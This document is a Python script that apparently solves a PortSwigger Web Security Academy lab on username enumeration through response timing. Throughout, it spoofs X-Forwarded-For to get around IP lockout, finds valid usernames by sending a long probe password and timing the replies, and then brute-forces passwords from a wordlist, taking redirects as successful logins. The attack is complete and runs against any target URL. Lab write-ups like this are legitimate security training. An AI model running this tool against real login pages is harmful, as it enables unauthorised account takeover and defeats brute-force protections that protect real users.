#!/usr/bin/env python3
"""
Username enumeration via response timing (PortSwigger lab solver).

Lab logic:
  - Too many failed logins -> your IP gets blocked. Bypass by spoofing
    X-Forwarded-For with a different value per request.
  - Timing side channel: if the username EXISTS, the server spends extra time
    hashing the submitted password, so a LONG password makes the response
    noticeably SLOWER. If the username does not exist, timing stays flat.

Phases:
  PHASE 1 (username)  long password (~100 chars) + X-Forwarded-For spoof.
                      Measure elapsed time per username.
                      valid username <=> elapsed time is an outlier (much slower).
  PHASE 2 (password)  for the valid username, try each password.
                      success <=> HTTP 301/302/303/307/308.

No hardcoded usernames or passwords — wordlists come from files.

Usage:
  python3 Username-enumeration-via-response-timing.py \
      --url https://<id>.web-security-academy.net/login \
      --cookie "session=..." \
      --usernames usernames.txt --passwords passwords.txt

  ... --long-password 100     # length of the timing probe password
  ... --slow-factor 1.5       # valid if slower than median * factor
  ... --verbose               # show elapsed time per attempt
  ... --csv timing.csv
  ... --phase usernames
  ... --phase passwords --username <found-user>
  ... --proxy http://127.0.0.1:8080
"""
from __future__ import annotations

import argparse
import csv
import re
import statistics
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    from requests import RequestException
except ImportError:
    print('error: pip3 install requests', file=sys.stderr)
    sys.exit(2)


def load_list(path: Path) -> list[str]:
    out, seen = [], set()
    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
        s = line.strip()
        if s and s not in seen:
            seen.add(s)
            out.append(s)
    return out


def main() -> int:
    ap = argparse.ArgumentParser(
        description='Username enumeration via response timing (XFF spoof).')
    ap.add_argument('--url', required=True)
    ap.add_argument('--cookie', default='')
    ap.add_argument('--usernames', default='usernames.txt')
    ap.add_argument('--passwords', default='passwords.txt')
    ap.add_argument('--user-field', default='username')
    ap.add_argument('--pass-field', default='password')
    ap.add_argument('--long-password', type=int, default=100,
                    help='length of the timing probe password (default 100)')
    ap.add_argument('--xff-header', default='X-Forwarded-For',
                    help='header used to spoof source IP (default X-Forwarded-For)')
    ap.add_argument('--xff-start', type=int, default=1)
    ap.add_argument('--slow-factor', type=float, default=1.5,
                    help='valid username if elapsed > median * factor (default 1.5)')
    ap.add_argument('--min-delay-ms', type=float, default=0.0,
                    help='optional sleep between requests (seconds)')
    ap.add_argument('--user-agent', default='Mozilla/5.0 (TimingEnumeration)')
    ap.add_argument('--proxy', default='')
    ap.add_argument('--timeout', type=float, default=30.0)
    ap.add_argument('--insecure', action='store_true')
    ap.add_argument('--all', action='store_true')
    ap.add_argument('--verbose', action='store_true')
    ap.add_argument('--csv', default='')
    ap.add_argument('--phase', choices=['usernames', 'passwords', 'both'], default='both')
    ap.add_argument('--username', default='')
    args = ap.parse_args()

    usernames = load_list(Path(args.usernames))
    passwords = load_list(Path(args.passwords))
    if not usernames or not passwords:
        print('error: username/password wordlist is empty', file=sys.stderr)
        return 2

    s = requests.Session()
    s.headers.update({
        'User-Agent': args.user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    if args.cookie:
        s.headers['Cookie'] = args.cookie

    p = urlparse(args.url)
    vhost = f'{p.scheme}://{p.netloc}'
    s.headers['Origin'] = vhost
    s.headers['Referer'] = vhost + '/login'

    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    verify = not args.insecure
    probe_pw = 'A' * args.long_password

    xff_counter = args.xff_start
    rows: list[tuple[str, str, str, int, float, str]] = []

    def attempt(phase: str, user: str, pwd: str):
        nonlocal xff_counter
        headers = {args.xff_header: str(xff_counter)}
        xff_counter += 1
        body = {args.user_field: user, args.pass_field: pwd}
        t0 = time.perf_counter()
        try:
            r = s.post(args.url, data=body, headers=headers,
                       timeout=args.timeout, allow_redirects=False,
                       proxies=proxies, verify=verify)
        except RequestException as e:
            print(f'[!] error {phase} {user}: {e}', file=sys.stderr)
            time.sleep(1)
            return None
        elapsed = time.perf_counter() - t0
        loc = r.headers.get('Location', '')
        rows.append((phase, user, pwd[:24], r.status_code, round(elapsed, 4), loc))
        if args.verbose:
            print(f'    {phase:8s} {user:<16s} status={r.status_code} '
                  f'time={elapsed:.3f}s {loc}', file=sys.stderr)
        if args.min_delay_ms:
            time.sleep(args.min_delay_ms)
        return r, elapsed

    # ---------- PHASE 1: usernames (timing) ----------
    valid: list[str] = []
    if args.phase in ('usernames', 'both') and not args.username:
        print(f'[*] PHASE 1: {len(usernames)} username '
              f'(probe password len={args.long_password}, XFF spoof on)', file=sys.stderr)
        times: list[tuple[str, float]] = []
        for u in usernames:
            res = attempt('user', u, probe_pw)
            if res is None:
                continue
            _, elapsed = res
            times.append((u, elapsed))

        if times:
            vals = [t for _, t in times]
            med = statistics.median(vals)
            thr = med * args.slow_factor
            print(f'[*] median={med:.3f}s threshold={thr:.3f}s '
                  f'(factor {args.slow_factor})', file=sys.stderr)
            for u, t in times:
                if t >= thr:
                    print(f'[+] SLOW (candidate valid): {u} {t:.3f}s', file=sys.stderr)
                    valid.append(u)
            if not valid:
                # fallback: take the single slowest if nothing crossed threshold
                u, t = max(times, key=lambda x: x[1])
                print(f'[!] nothing crossed the threshold; slowest candidate: '
                      f'{u} {t:.3f}s', file=sys.stderr)
                valid.append(u)

    if args.phase == 'usernames':
        print('\nCANDIDATE USERNAMES: ' + (', '.join(valid) if valid else 'none'))
        if args.csv:
            with open(args.csv, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                w.writerow(('phase', 'user', 'pass', 'status', 'elapsed', 'location'))
                w.writerows(rows)
            print(f'[*] CSV: {args.csv}', file=sys.stderr)
        return 0 if valid else 1

    # ---------- PHASE 2: passwords ----------
    targets = [args.username] if args.username else valid
    if not targets:
        print('[-] no valid username; skipping phase 2', file=sys.stderr)
        return 1

    print(f'[*] PHASE 2: {len(passwords)} password for {targets}', file=sys.stderr)
    hits: list[tuple[str, str, int]] = []
    for u in targets:
        for pw in passwords:
            res = attempt('pass', u, pw)
            if res is None:
                continue
            r, _ = res
            if r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get('Location', '')
                print(f'[+] HIT {u}:{pw} status={r.status_code} {loc}', file=sys.stderr)
                hits.append((u, pw, r.status_code))
                if not args.all:
                    break
        if hits and not args.all:
            break

    if args.csv:
        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            w.writerow(('phase', 'user', 'pass', 'status', 'elapsed', 'location'))
            w.writerows(rows)
        print(f'[*] CSV: {args.csv}', file=sys.stderr)

    if hits:
        for u, pw, st in hits:
            print(f'HIT {u}:{pw} ({st})')
        return 0
    print('[-] password not found', file=sys.stderr)
    return 1


if __name__ == '__main__':
    sys.exit(main())